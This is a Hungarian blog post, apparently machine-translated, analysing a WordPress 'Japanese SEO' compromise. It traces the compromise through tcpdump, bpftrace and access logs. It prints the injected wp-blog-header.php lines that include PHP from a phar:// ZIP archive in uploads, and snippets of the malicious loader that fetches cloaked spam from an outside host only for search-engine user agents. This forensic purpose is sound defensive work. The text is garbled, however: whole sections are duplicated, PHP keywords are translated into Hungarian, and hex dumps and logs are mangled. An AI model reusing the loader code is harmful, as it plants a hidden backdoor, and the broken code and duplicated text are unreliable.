@@ -1,0 +1,381 @@
+---
+title: "A Wordpress hack kódot bont ki (japán SEO hack) és futtat a feltöltött ZIP fájlból"
+date: "2023-05-22"
+excerpt: "A Wordpress (japán SEO) hack kódot bont ki és futtat a feltöltött ZIP fájlból A Wordpress jelenleg a világ leggyakrabban használt webes CMS-alkalmazása. Ezért n..."
+image: "/assets/banners/webdude-hero.webp"
+noindex: false
+---
+
+<h1><a href="https://webdude.hu/a-wordpress-japan-seo-hack-kodot-bont-ki-es-futtat-a-feltoltott-zip-fajlbol/">A Wordpress (japán SEO) hack kódot bont ki és futtat a feltöltött ZIP fájlból</a></h1>
+
+A <a href="https://wordpress.org/">Wordpress</a> jelenleg a világ leggyakrabban használt webes CMS-alkalmazása. Ezért nem meglepő, hogy a Wordpress-telepítéseket nagyon gyakran támadják . Míg a támadó a fájlrendszerhez való hozzáférésének módja szinte mindig azonos (akár egy biztonsági rés használatával, akár egy meglévő, gyenge vagy brutálisan kényszerített hitelesítő adatokkal rendelkező bejelentkezés használatával), a későbbi lépések eltérőek.
+
+Előfordulhat, hogy néhány támadó csak feltölt néhány szkriptet, amelyek több ezer spam e-mailt küldenek ki. Mások olyan szkripteket és folyamatokat futtathatnak , amelyek más Wordpress-telepítéseket támadnak meg. Mások viszont manipulálják a Wordpress oldalak tartalmát. Számos lehetőség kínálkozik arra, hogy egy sikeres támadó mit kezdjen egy feltört Wordpress-oldallal.
+
+Ez a hack, amit az elmúlt pár napban fedeztünk fel, olyan, amit még nem láttunk, és ezért érdemes írni róla. De kezdjük az elején.
+
+<h2>A japán karakterek megjelennek a Google-on a keresési eredmények között</h2>
+
+Az egész valami nagyon furcsa dologgal kezdődött. Az érintett, Wordpress 6.x-et futtató weboldal hirtelen keleti (japán) karakterekkel jelent meg a Google keresési eredményei között.
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/1237-different-http-response-googlebot_small.png" alt="" width="600" height="333" />
+
+bben a helyzetben egy teljesen más japán tartalom töltődik be. Az említett helyi hivatkozások (/4244wpjv43a.html) egyikének megnyitásával valóban láthatunk egy japán oldalt, amely képeket tartalmaz:
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/1237-japanese-content-page_small.png" alt="" width="600" height="411" />
+
+Ideje mélyebbre ásni, hogy megtudja, honnan ered.
+
+<h2>A rosszindulatú programkeresők semmit sem találnak</h2>
+
+Egy feltört Wordpress. Ott voltunk, megcsináltuk, mivel ezt a fajta távoli szerver hibaelhárítást/elemzést kínáljuk ügyfeleinknek. Első tippünk egy manipulált vagy a támadó által telepített kiegészítő bővítmény volt. A rosszindulatú kódok általában gyorsan megtalálhatók rosszindulatú programkeresőkkel, például a php-malware-scanner segítségével . Bár volt néhány rosszindulatú kódra utaló eredmény, az egyes fájlok vizsgálata után ezek mindegyike hamis pozitívnak bizonyult.
+
+Lehet, hogy a japán tartalom benne van az adatbázisban? De még az adatbázis dump átkaparása sem tárt fel semmilyen japán tartalmat, nem beszélve a manipulált bejegyzésekről.
+
+A választörzsben található több szót használó  <strong>grep sem mutatott eredményt a Wordpress telepítésén belüli összes fájlon keresztül.</strong>
+
+Honnan ez a tartalom?! Ilyenkor határozottan kapkodjuk a fejünket.
+
+<h2>A Tcpdump külső HTTP GET-et jelenít meg - minden kérésnél</h2>
+
+Úgy döntöttünk, hogy sebességet váltunk, és a hálózatra helyezzük a hangsúlyt. Történik valamilyen szokatlan (kimenő) hálózati tevékenység, amikor egy kérés érkezik a Wordpress webhelyére? Elindítottuk a tcpdump-ot, és az internetre néző felületen hallgattuk. És valóban, néhány másodperccel később néhány ígéretes eredménnyel szembesültünk.
+
+```bash
+root@wordpress:~# tcpdump -i eth0 port 80 -X
+tcpdump: bőbeszédű kimenet elnyomva, használja a -v vagy -vv parancsot a teljes protokoll dekódolásához
+eth0-n, link típusú EN10MB (Ethernet), rögzítési méret 262144 bájt
+17:54: 54.399661 IP www.example.com.43018 > 173.208.198.115.http: Zászlók [S], szekv. 3867413820, win 64240, opciók [mss 1460,sackOK,TS val 3890e,70 hossz 3890n,cr15n x0000
+: 4500 003c bb3f 4000 4006 ad18 2d4d 30d3 E..<.?@.@...-M0.
+0x0010: add0 c673 a80a 0050 e684 0d3c 0000 0000 ...s...P...<....
+0x0020: a002 faf0 d292 0000 0204 05b4 0402 080a.. ..
+0x0030: e7f3 d062 0000 0000 0103 0307 ...b.........
+17:54:54.595456 IP 173.208.198.115.http > www.example.com.43018: Flags [S.], seq 3526600846, acck 3867413821, win 28960, 46,30TSa, 47,30 ms, opciók ecr 3891515490,nem, wscale 7], hossza 0
+0x0000: 4500 003c 0000 4000 3206 7658 add0 c673 E..<..@.2.vX...s
+0x0010: 2d4d 30d3 0050 a80a 80d3 0050 a80a 80d3 .....=
+0x0020: a012 7120 a3c2 0000 0204 05b4 0402 080a ..q.............
+0x0030: 3469 5d0a e7f3 d062 0103 0307 4i]....... .
+17:54:54.595540 IP www.example.com.43018 > 173.208.198.115.http: Flags [.], ack 1, win 502, opciók [nop,nop,TS val 3891515686
+0 0034 bb40 4000 4006 ad1f 2d4d 30d3 E..4.@@.@...-M0.
+0x0010: add0 c673 a80a 0050 e684 0d3d d233 a88f ...s...P...=.3..
+0x0020: 8010 01f6 d28a 0000 0101 080a e7f3 .............. .&
+0x0030: 3469 5d0a 4i].
+17:54:54.595657 IP www.example.com.43018 > 173.208.198.115.http: Zászlók [P.], 1:168 szekv., ak. 1, win 502, opciók [nop,nop,TS val 38965 38915 308 e]308 e] hossz 167: HTTP: GET /indexnew.php?web=www.example.com&zz=1&uri=LzgwMDFreGtyZmF5YjAuaHRtbA==&urlshang=&http=https&lang= HTTP/1.1
+0x0000: 4500 0000: 4500 00000: 4500 00db 0bb41d 0 db 41db 3 E....A@ .@...w-M0.
+0x0010: add0 c673 a80a 0050 e684 0d3d d233 a88f ...s...P...=.3..
+0x0020: 8018 01f6 d331 0000 0101 080a 0101 080a e7f3 .....126 ........... .&
+0x0030: 3469 5d0a 4745 5420 2f69 6e64 6578 6e65 4i].GET./indexne
+0x0040: 772e 7068 703f 7765 623d 703f 7765 623d 703f 7765 623d 70x. 0050:
+7265 6e6e 6961 6c2e 6e65 742e 6175 267a ample.com&z
+0x0060 - 0080: 6241 3d3d 2675 726c 7368 616e 673d 2668 bA==&     urlshang=&h 0x0090:
+7474 703d 6874 7470 7326     6c61 3d20 ttp=https&lang=.     0x00a0: 4854 5450 2f31 2e31 0d0a 486f 7374 3a20 HTTP/1.1.. Gazda:.     0x00b0: 6761 6569 6768 7479 7468 7265 6569 782e  gaeightythreeix.     0x00c0: 7261 7967 756e 2e74 6f70 0d0a 4163 6365  raygun.top.
+
+ 
+
+.Acce
+0x00d0: 7074 3a20 2a2f 2a0d 0a0d 0a pt:.*/*....
+17:54:54.791643 IP 173.208.198.115.http > www.example.com: Flag26 [8], Flag26 [8]. , opciók [nop,nop,TS val 879320526 ecr 3891515686], hossz 0
+0x0000: 4500 0034 f541 4000 3206 811e add0 c673 E..4.A@.2d
+30030x000d 30x00d d233 a88f e684 0de4 -M0..P...3......
+0x0020: 8010 00eb 4095 0000 0101 080a 3469 5dce ....@.......4i].
+0x0030: e7f3 d126 ...&
+17:54:54.800227 IP 173.208.198.115.http > www.example.com.43018: Flags [.], seq 1:2897, ack 168, n op, win, 2op TS val 879320534 ecr 3891515686], hossza 2896: HTTP: HTTP/1.1 200 OK
+```
+
+A Tcpdump feltárja, hogy HTTP-kérést küldtek a gaeightythreeix.raygun.top tartományba , egy /indexnew.php URL-t használva, és a Wordpress-telepítés tartományát tartalmazó GET-paramétereket küldtek.
+
+<h2>A japán tartalom: távoli szerverről származik!</h2>
+
+Ha követi ezt a külső domaint, és megnyitja ugyanazt az URL-t a böngészőben, ugyanazt a japán tartalmat jeleníti meg.
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/1237-japanese-page-raygun_small.png" alt="" width="600" height="433" />
+
+A GET paramétereitől függően a tartalom (véletlenszerűen?) módosul, és más terméket mutat. Itt a "web" paraméter egy másik tartományhoz igazodik, és a tartalom megváltozik:
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/1237-different-parameter-content_small.png" alt="" width="600" height="426" />
+
+Ezen információk birtokában ma már tudjuk, hogy a tartalom külső URL-ről töltődik be, és a Wordpress oldal tetejére kerül . Most már érthető, hogy nem tudtunk semmit a tartalommal kapcsolatban visszaolvasni - sem az adatbázisban, sem a Wordpress-ben. fájlokat.
+
+De ezen a ponton még mindig nem tudjuk, hogy melyik szkript vagy bővítmény tölti be a tartalmat a gaeightythreeix.raygun.top webhelyről. Még egy grep ehhez a domainhez sem fedte fel a felelős fájlt!
+
+<h2>Fájlkövetés a bpftrace segítségével</h2>
+
+Úgy döntöttünk, hogy most megnyitjuk a nagy arzenált. Annak érdekében, hogy azonosítsuk az összes megnyitott fájlt ((sys_enter_openat) a Wordpress webhely minden egyes kérésére, a bpftrace-t használtuk , egy nagyon hatékony eszközt a Linux kernelből származó syscall-ok elkapására, hasonló a Solaris dtrace -hez. A remény az volt, hogy bármit elkaphatunk a közönséges, bár egy Wordpress sok pluginnal sok megnyitott fájlt mutat a kimenetben. Hogy a kimenetet csak PHP-folyamatokra csökkentsük, a bpftrace-t használtuk a / comm = "php-fpm7.4"/ szűrővel. És mi nem csalódtunk!
+
+```bash
+root@wordpress:~# bpftrace -e 'tracepoint:syscalls:sys_enter_openat /comm == "php-fpm7.4"/ { printf("%s %s\n", comm, str(args->fájlnév)); }'
+1 vizsgáló csatolása…
+[...]
+php-fpm7.4 /var/www/www.example.com/wp-content/plugins/bridge-core/module
+php-fpm7.4 /var/www/www. example.com/wp-content/plugins/bridge-core/module
+php-fpm7.4 /var/www/www.example.com/wp-content/plugins/bridge-core/module
+php-fpm7.4 /var/ www/www.example.com/wp-content/plugins/bridge-core/module
+php-fpm7.4 /var/www/www.example.com/wp-content/plugins/bridge-core/module
+php-fpm7. 4 /var/www/www.example.com/wp-content/uploads/2021/index.zip
+php-fpm7.4 /etc/hosts
+[...]
+```
+
+Természetesen a zip fájl felkeltette az érdeklődésünket, mivel nem számítottunk arra, hogy egy zip fájl megjelenik a megnyitott fájlok listájában. És meglepetésünkre a zip fájl minden HTTP kérésnél felbukkant az érintett Wordpress webhelyen. Nézzük meg közelebbről ezt a zip fájlt.
+
+<h2>Rosszindulatú PHP-kód a ZIP-fájlban</h2>
+
+Az időbélyeg szerint a zip fájlt néhány napja töltötték fel:
+
+```bash
+root@wordpress:~# ls -la /var/www/www.example.com/wp-content/uploads/2021/index.zip
+-rw-r--r-- 1 www-data www-data 1922. augusztus 16. 19:39 /var/www/www.example.com/wp-content/uploads/2021/index.zip
+```
+
+Az index.zip fájlban található egy index.php fájl:
+
+```bash
+root@wordpress:~# unzip /var/www/www.example.com/wp-content/uploads/2021/index.zip -d /tmp/claudio
+Archívum: /var/www/www.example.com/wp- content/uploads/2021/index.zip
+felfújás: /tmp/claudio/index.php
+
+root@wordpress:~# cd /tmp/claudio
+root@wordpress:/tmp/claudio# ls -la
+összesen 44
+drwxr-xr-x 2 gyökér gyökér 4096 augusztus 22 19:01 ./
+drwxrwxrwt 24 gyökér gyökér 32768 augusztus 22 19:01 ../
+-rw-r--r-- 1 gyökér gyökér 6058 augusztus 16 14:18 index.php
+```
+
+Ha megnézzük ezt az index.php fájlt, végre kiderül a rosszindulatú kód, amely betölti a japán tartalmat egy külső webhelyről.
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/1237-php-code-japanese-seo-hack_small.png" alt="" width="600" height="484" />
+
+Ebben a helyzetben egy teljesen más japán tartalom töltődik be. Az említett helyi hivatkozások (/4244wpjv43a.html) egyikének megnyitásával valóban láthatunk egy japán oldalt, amely képeket tartalmaz:
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/1237-japanese-content-page_small.png" alt="" width="600" height="411" />
+
+Ideje mélyebbre ásni, hogy megtudja, honnan ered.
+
+<h2>A rosszindulatú programkeresők semmit sem találnak</h2>
+
+Egy feltört Wordpress. Ott voltunk, megcsináltuk, mivel ezt a fajta távoli szerver hibaelhárítást/elemzést kínáljuk ügyfeleinknek. Első tippünk egy manipulált vagy a támadó által telepített kiegészítő bővítmény volt. A rosszindulatú kódok általában gyorsan megtalálhatók rosszindulatú programkeresőkkel, például a php-malware-scanner segítségével . Bár volt néhány rosszindulatú kódra utaló eredmény, az egyes fájlok vizsgálata után ezek mindegyike hamis pozitívnak bizonyult.
+
+Lehet, hogy a japán tartalom benne van az adatbázisban? De még az adatbázis dump átkaparása sem tárt fel semmilyen japán tartalmat, nem beszélve a manipulált bejegyzésekről.
+
+A választörzsben található több szót használó  grep sem mutatott eredményt a Wordpress telepítésén belüli összes fájlon keresztül.
+
+<h2>Honnan ez a tartalom?! Ilyenkor határozottan kapkodjuk a fejünket.</h2>
+
+A Tcpdump külső HTTP GET-et jelenít meg - minden kérésnél
+Úgy döntöttünk, hogy sebességet váltunk, és a hálózatra helyezzük a hangsúlyt. Történik valamilyen szokatlan (kimenő) hálózati tevékenység, amikor egy kérés érkezik a Wordpress webhelyére? Elindítottuk a tcpdump-ot, és az internetre néző felületen hallgattuk. És valóban, néhány másodperccel később néhány ígéretes eredménnyel szembesültünk.
+
+```bash
+root@wordpress:~# tcpdump -i eth0 port 80 -X
+tcpdump: bőbeszédű kimenet elnyomva, használja a -v vagy -vv parancsot a teljes protokoll dekódolásához
+eth0-n, link típusú EN10MB (Ethernet), rögzítési méret 262144 bájt
+17:54: 54.399661 IP www.example.com.43018 > 173.208.198.115.http: Zászlók [S], szekv. 3867413820, win 64240, opciók [mss 1460,sackOK,TS val 3890e,70 hossz 3890n,cr15n x0000
+: 4500 003c bb3f 4000 4006 ad18 2d4d 30d3 E..<.?@.@...-M0.
+0x0010: add0 c673 a80a 0050 e684 0d3c 0000 0000 ...s...P...<....
+0x0020: a002 faf0 d292 0000 0204 05b4 0402 080a.. ..
+0x0030: e7f3 d062 0000 0000 0103 0307 ...b.........
+17:54:54.595456 IP 173.208.198.115.http > www.example.com.43018: Flags [S.], seq 3526600846, acck 3867413821, win 28960, 46,30TSa, 47,30 ms, opciók ecr 3891515490,nem, wscale 7], hossza 0
+0x0000: 4500 003c 0000 4000 3206 7658 add0 c673 E..<..@.2.vX...s
+0x0010: 2d4d 30d3 0050 a80a 80d3 0050 a80a 80d3 .....=
+0x0020: a012 7120 a3c2 0000 0204 05b4 0402 080a ..q.............
+0x0030: 3469 5d0a e7f3 d062 0103 0307 4i]....... .
+17:54:54.595540 IP www.example.com.43018 > 173.208.198.115.http: Flags [.], ack 1, win 502, opciók [nop,nop,TS val 3891515686
+0 0034 bb40 4000 4006 ad1f 2d4d 30d3 E..4.@@.@...-M0.
+0x0010: add0 c673 a80a 0050 e684 0d3d d233 a88f ...s...P...=.3..
+0x0020: 8010 01f6 d28a 0000 0101 080a e7f3 .............. .&
+0x0030: 3469 5d0a 4i].
+17:54:54.595657 IP www.example.com.43018 > 173.208.198.115.http: Zászlók [P.], 1:168 szekv., ak. 1, win 502, opciók [nop,nop,TS val 38965 38915 308 e]308 e] hossz 167: HTTP: GET /indexnew.php?web=www.example.com&zz=1&uri=LzgwMDFreGtyZmF5YjAuaHRtbA==&urlshang=&http=https&lang= HTTP/1.1
+0x0000: 4500 0000: 4500 00000: 4500 00db 0bb41d 0 db 41db 3 E....A@ .@...w-M0.
+0x0010: add0 c673 a80a 0050 e684 0d3d d233 a88f ...s...P...=.3..
+0x0020: 8018 01f6 d331 0000 0101 080a 0101 080a e7f3 .....126 ........... .&
+0x0030: 3469 5d0a 4745 5420 2f69 6e64 6578 6e65 4i].GET./indexne
+0x0040: 772e 7068 703f 7765 623d 703f 7765 623d 703f 7765 623d 70x. 0050:
+7265 6e6e 6961 6c2e 6e65 742e 6175 267a ample.com&z
+0x0060 - 0080: 6241 3d3d 2675 726c 7368 616e 673d 2668 bA==&     urlshang=&h 0x0090:
+7474 703d 6874 7470 7326     6c61 3d20 ttp=https&lang=.     0x00a0: 4854 5450 2f31 2e31 0d0a 486f 7374 3a20 HTTP/1.1.. Gazda:.     0x00b0: 6761 6569 6768 7479 7468 7265 6569 782e  gaeightythreeix.     0x00c0: 7261 7967 756e 2e74 6f70 0d0a 4163 6365  raygun.top.
+
+ 
+
+.Acce
+0x00d0: 7074 3a20 2a2f 2a0d 0a0d 0a pt:.*/*....
+17:54:54.791643 IP 173.208.198.115.http > www.example.com: Flag26 [8], Flag26 [8]. , opciók [nop,nop,TS val 879320526 ecr 3891515686], hossz 0
+0x0000: 4500 0034 f541 4000 3206 811e add0 c673 E..4.A@.2d
+30030x000d 30x00d d233 a88f e684 0de4 -M0..P...3......
+0x0020: 8010 00eb 4095 0000 0101 080a 3469 5dce ....@.......4i].
+0x0030: e7f3 d126 ...&
+17:54:54.800227 IP 173.208.198.115.http > www.example.com.43018: Flags [.], seq 1:2897, ack 168, n op, win, 2op TS val 879320534 ecr 3891515686], hossza 2896: HTTP: HTTP/1.1 200 OK
+```
+
+A Tcpdump feltárja, hogy HTTP-kérést küldtek a gaeightythreeix.raygun.top tartományra , egy /indexnew.php URL-t használva, és a Wordpress-telepítés tartományát tartalmazó GET-paramétereket küldtek.
+
+<h2>A japán tartalom: távoli szerverről származik!</h2>
+
+Ha követi ezt a külső domaint, és megnyitja ugyanazt az URL-t a böngészőben, ugyanazt a japán tartalmat jeleníti meg.
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/1237-japanese-page-raygun_small.png" alt="" width="600" height="433" />
+
+A GET paramétereitől függően a tartalom (véletlenszerűen?) módosul, és más terméket mutat. Itt a "web" paraméter egy másik tartományhoz igazodik, és a tartalom megváltozik:
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/1237-different-parameter-content_small.png" alt="" width="600" height="426" />
+
+Ezen információk birtokában ma már tudjuk, hogy a tartalom külső URL-ről töltődik be, és a Wordpress oldal tetejére kerül . Most már érthető, hogy nem tudtunk semmit a tartalommal kapcsolatban visszaolvasni - sem az adatbázisban, sem a Wordpress-ben. fájlokat.
+
+De ezen a ponton még mindig nem tudjuk, hogy melyik szkript vagy bővítmény tölti be a tartalmat a gaeightythreeix.raygun.top webhelyről. Még egy grep ehhez a domainhez sem fedte fel a felelős fájlt!
+
+<h2>Fájlkövetés a bpftrace segítségével</h2>
+
+Úgy döntöttünk, hogy most megnyitjuk a nagy arzenált. Annak érdekében, hogy azonosítsuk az összes megnyitott fájlt ((sys_enter_openat) a Wordpress webhely minden egyes kérésére, a bpftrace-t használtuk , egy nagyon hatékony eszközt a Linux kernelből származó syscall-ok elkapására, hasonló a Solaris dtrace -hez. A remény az volt, hogy bármit elkaphatunk a közönséges, bár egy Wordpress sok pluginnal sok megnyitott fájlt mutat a kimenetben. Hogy a kimenetet csak PHP-folyamatokra csökkentsük, a bpftrace-t használtuk a / comm = "php-fpm7.4"/ szűrővel. És mi nem csalódtunk!
+
+```bash
+root@wordpress:~# bpftrace -e 'tracepoint:syscalls:sys_enter_openat /comm == "php-fpm7.4"/ { printf("%s %s\n", comm, str(args->fájlnév)); }'
+1 vizsgáló csatolása…
+[...]
+php-fpm7.4 /var/www/www.example.com/wp-content/plugins/bridge-core/module
+php-fpm7.4 /var/www/www. example.com/wp-content/plugins/bridge-core/module
+php-fpm7.4 /var/www/www.example.com/wp-content/plugins/bridge-core/module
+php-fpm7.4 /var/ www/www.example.com/wp-content/plugins/bridge-core/module
+php-fpm7.4 /var/www/www.example.com/wp-content/plugins/bridge-core/module
+php-fpm7. 4 /var/www/www.example.com/wp-content/uploads/2021/index.zip
+php-fpm7.4 /etc/hosts
+[...]
+```
+
+Természetesen a zip fájl felkeltette az érdeklődésünket, mivel nem számítottunk arra, hogy egy zip fájl megjelenik a megnyitott fájlok listájában. És meglepetésünkre a zip fájl minden HTTP kérésnél felbukkant az érintett Wordpress webhelyen. Nézzük meg közelebbről ezt a zip fájlt.
+
+<h2>Rosszindulatú PHP-kód a ZIP-fájlban</h2>
+
+Az időbélyeg szerint a zip fájlt néhány napja töltötték fel:
+
+```bash
+root@wordpress:~# ls -la /var/www/www.example.com/wp-content/uploads/2021/index.zip
+-rw-r--r-- 1 www-data www-data 1922. augusztus 16. 19:39 /var/www/www.example.com/wp-content/uploads/2021/index.zip
+```
+
+Az index.zip fájlban található egy index.php fájl:
+
+```bash
+root@wordpress:~# unzip /var/www/www.example.com/wp-content/uploads/2021/index.zip -d /tmp/claudio
+Archívum: /var/www/www.example.com/wp- content/uploads/2021/index.zip
+felfújás: /tmp/claudio/index.php
+
+root@wordpress:~# cd /tmp/claudio
+root@wordpress:/tmp/claudio# ls -la
+összesen 44
+drwxr-xr-x 2 gyökér gyökér 4096 augusztus 22 19:01 ./
+drwxrwxrwt 24 gyökér gyökér 32768 augusztus 22 19:01 ../
+-rw-r--r-- 1 gyökér gyökér 6058 augusztus 16 14:18 index.php
+```
+
+Ha megnézzük ezt az index.php fájlt, végre kiderül a rosszindulatú kód, amely betölti a japán tartalmat egy külső webhelyről.
+
+<img className="aligncenter" src="https://webdude.hu/wp-content/uploads/2023/05/1237-php-code-japanese-seo-hack_small.png" alt="" width="600" height="484" />
+
+A fájl 173 sort tartalmaz. Nézzük a legfontosabb kódrészleteket.
+
+Szinte a tetején láthatjuk a $xmlname-tváltozó, amely néhány karaktert tartalmaz. Az urldecode() futtatásával a $xmlname helyen a következő karakterláncot kapjuk: tnrvtuglguerrvk.enltha.gbc.
+Ha ezt a karakterláncot az str_rot13() függvényen keresztül futtatjuk, a következő karakterláncot kapjuk: gaeightythreeix.raygun.top .
+
+Ismerősen hangzik, igaz? Ez a külső tartomány a japán tartalom betöltésére, és $goweb változóként van elmentve a szkripten belül.
+
+A későbbiekben ebben a szkriptben a tényleges tartalom lekérése a külső URL-ről:
+```php
+$web = $http_web . '://' . $goweb . '/indexnew.php?web=' . $host . '&zz=' . disbot() . '&uri=' . $duri . '&urlshang=' . $urlshang . '&http=' . $http . '&lang=' . $lang;
+$html_content = trim(doutdo($web));
+```
+
+És néhány sorral lejjebb találunk egy disbot() függvényt , amely kiolvassa a HTTP User-Agentet a HTTP kérésből:
+
+```php
+function disbot()
+{
+$uAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+if (stristr($uAgent, 'googlebot') || stristr($uAgent, 'bing') || stristr($uAgent, 'yahoo') || stristr($uAgent, 'google') || stristr($uAgent , 'Googlebot') || stristr($uAgent, 'googlebot')) {
+return true;
+} else {
+return false;
+}
+}
+```
+
+Ez a funkció felelős a különböző felhasználói ügynökök kezeléséért és a különböző tartalmak megjelenítéséért, a User-Agenttől függően. Emlékszel a curl-re – „Googlebot” az elején? <strong>Ez váltotta ki ezt a funkciót, hogy igazat adjon vissza, és felfedje a japán tartalmat.</strong>
+
+Rendben, most azonosítottuk a<strong> rosszindulatú kódot, amely egy zip-fájlból töltődik be minden kérésre ezen a Wordpress-webhelyen</strong> . De még nem találtuk meg azt a szkriptet, amely ténylegesen betölti és beolvassa a tartalmat a zip fájlból.
+
+<h2>A Wordpress tartalmazza a Phar archívum tartalmát</h2>
+
+Az összes fájlon végzett újabb kutatás után ezúttal a "zip" kiterjesztésre összpontosítottunk. És azonnal találtunk egy másik manipulált fájlt: wp-blog-header.php . Ez a PHP-szkript az eredeti Wordpress-telepítés része, de a hacker módosította. :
+
+```bash
+root@wordpress:~# cat /var/www/www.example.com/wp-blog-header.php
+<?php
+/**
+* Betölti a WordPress környezetet és sablont.
+*
+* @Package WordPress
+*/
+
+if ( ! isset( $wp_did_header ) ) {
+
+$wp_did_header = true;
+
+// A WordPress könyvtár betöltése.
+igényel_egyszer __DIR__ . '/wp-load.php';
+$file = 'index';
+$feltöltési_könyvtár = wp_feltöltési_könyvtár();
+$folder = $upload_dir['basedir'] . "/2021/$file.zip/$file.php";
+include('phar://'.$mappa);
+
+// A WordPress lekérdezés beállítása.
+wp();
+
+// A téma sablon betöltése.
+igényel_egyszer ABSPATH . WPINC . '/template-loader.php';
+```
+
+<strong>Megjegyzés: A manipulált (hozzáadott) kód kiemelve volt a fenti kimeneten. </strong>
+
+A wp-blog-header.php fájl a Wordpress minden kérésére betöltődik, és úgy módosult, hogy egy phar archívumból töltsön be tartalmat (beleértve) , meglepetésszerűen az index.zip fájlra mutatva!
+
+<a href="https://www.php.net/manual/en/book.phar.php">Hogy őszinte legyek, a mai napig személy szerint nem is tudtam, hogy a PHP phar:// kiterjesztésével</a> menet közben is bele lehet helyezni egy tömörített PHP kódot . Ez minden bizonnyal nagyon egyedi és érdekes megközelítés!
+
+És nagyon hatékonynak bizonyult, mert a rosszindulatú programkeresők főként a tipikus kódrészletekre összpontosítanak olyan függvények használatával, mint a base64_decode() vagy a beágyazott változókat értékként használó változókra.
+
+Mostanra megértettük, <strong>hogyan működik ez a japán SEO hack technikailag</strong>. De még nem tudjuk, hogyan került fel ez a zip fájl, és hogyan módosult a wp-blog-header.php.
+
+<h2>Az eredet nyomon követése: Sikeres bejelentkezés</h2>
+
+Ezen a ponton visszatérünk a cikk legelső részéhez: Mi a belépési pont? A Wordpress vagy annak valamelyik bővítményének vagy témájának sebezhetősége volt? Vagy egy Wordpress-fiókot feltörtek, és a manipulációk elvégzésére használták?
+
+Ha a hozzáférési naplókat többé-kevésbé a zip-fájl létrehozásának idejére követjük, a következő HTTP-kérést találtuk, az<strong> index.zip fájlt a wp_file_manager beépülő modul segítségével feltöltve</strong>:
+
+> - GVudC91cGxvYWRzLzIwMjE&intersect%5B%5D=index " 537.36 (KHTML, mint a Gecko) Chrome/103.0.0.0 Safari/537.36"
+
+Ha közelebbről megvizsgáljuk az erről az IP-ről származó kéréseket, akkor a wp_file_manager beépülő modul néhány perccel korábbi telepítése látható:
+
+> 204.188.232.195 - - [16/Aug/2022:19:36:12 +1000] "POST /wp-admin/admin-ajax.php?_fs_blog_admin=true HTTP/2.0" 200 9103 "https://www.example .com/wp-admin/admin.php?page=wp_file_manager" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, mint a Gecko) Chrome/103.0.0.0 Safari/537.36"
+
+Ezt a beépülő modult használták a zip fájl feltöltésére (ezt már tudtuk), de a wp-blog-header.php fájl módosítására is:
+
+> - 5B%5D=wp -blog-header.php&reqid=182a6060bc3343&_fs_blog_admin=true HTTP/2.0" 200 81 "https://www.example.com/wp-admin/admin.php?page=wp_file_manager" "Mozilla/NT 6.0;.0 Windows NT/5.0; x64) AppleWebKit/537.36 (KHTML, mint a Gecko) Chrome/103.0.0.0 Safari/537.36"
+
+A kérések visszakövetése a legelső kérésekig sikeres bejelentkezést mutat (minden előzetes brute-force támadás nélkül, mindenképpen erről az IP-ről) a Wordpress háttérrendszerén:
+
+> 204.188.232.195 - - [16/Aug/2022:19:33:42 +1000] " GET /wp-login.php HTTP/2.0" 200 2253 "-" "Mozilla/5.0 (Windows NT 10.0; Win 64; x64) AppleWebKit/537.36 (KHTML, mint a Gecko) Chrome/103.0.0.0 Safari/537.36"
+> 
+> 204.188.232.195 - - [16/Aug/2022:19:34:11 +1000] " POST /wp-login.0 " HTTP2 200 2300 "https://www.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, mint a Gecko) Chrome/103.0.0.0 Safari/537.36" 204.23
+> 
+> -9.18 [16/aug/2022:19:35:05 +1000] " POST /wp-login.php HTTP/2.0" 302 0 "https://www.example.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, mint a Gecko) Chrome/103.0.0.0 Safari/537.36"
+> 
+> 204.188.232.195 - - [16/Aug/2022:19:35:08 +1000] "GET /wp-admin/ HTTP/2.0" 200 71258 "https://perennial.net.au/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, mint a Gecko ) Chrome/103.0.0.0 Safari/537.36"
+
+A támadónak két kísérlet kellett ahhoz, hogy sikeresen bejelentkezzen a Wordpress háttérrendszerébe. Az a tény, hogy a hitelesítő adatok tényleges megadása között eltelt néhány másodperc, azt jelentheti, hogy <strong>a jelszót valahol egy listán keresték , és onnan másolták.</strong> Ez azt jelenti: A jelszó ismert volt. Ez lehet egy múltbeli adatvédelmi incidensből kiszivárgott jelszavakkal visszakeresett jelszó, és ugyanazt a jelszót használta ez a felhasználó ezen a Wordpress-en, vagy lehet <strong>egy trójai vagy jelszószippantó is a felhasználó számítógépén.</strong>
+
+<h2>TL;DR: Ez a japán kulcsszó/SEO hack</h2>
+
+<strong>A japán kulcsszó/SEO feltörés egy olyan feltörés, ahol a Wordpress-telepítést úgy manipulálják, hogy külső (japán) tartalmat töltsenek be</strong> bizonyos felhasználói ügynökök, például a Google Bot számára. A cél nagy valószínűséggel a Google robotjainak becsapása és a Google keresési eredményeinek manipulálása bizonyos termékekre vonatkozóan.
+
+A <strong>külső tartalom Wordpress tetejére történő betöltéséért felelős PHP-kód egy ZIP-fájlból töltődik be , dinamikusan kicsomagolódik, és minden kérésre szerepel</strong>, a PHP phar osztály használatával az archívumok kezelésére.
+
+Ez a fajta feltörés, a dinamikusan betöltött zip fájl használata új volt számunkra, így nehéz volt felismerni. Előfordulhat, hogy a rosszindulatú programok keresői még nincsenek tisztában az ilyen típusú kódbefoglalással, és eltarthat egy ideig, amíg a rosszindulatú programkeresők tudják, mit kell keresniük.
+
+Technikailag nagyon szépen kivitelezett és jól rejtett hack. Ebben az esetben azonban ez csak egy nem biztonságos vagy kiszivárgott, már meglévő Wordpress-felhasználó jelszavának a használata tette lehetővé, ami elkerülhető lett volna.
+
